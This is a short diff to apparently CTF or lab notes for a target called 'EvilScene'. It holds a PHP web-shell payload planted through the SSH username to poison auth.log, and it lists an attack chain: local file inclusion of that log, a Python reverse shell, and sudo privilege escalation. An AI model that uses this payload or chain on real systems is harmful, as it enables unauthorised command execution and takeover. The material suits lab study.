@@ -2,6 +2,9 @@ EvilScene
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 To exploit ssh ‘<?php system($_GET[‘C’]);?>’@192.168.1.146
+[+] Local File Inclusion LFI = in access log /var/log/auth.log -  SSH log -LFI
+[+] Python Reverse Shell
+[+] Privilege Escalation abusing SUDO rights - xxxlogauditorxxx.py
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 
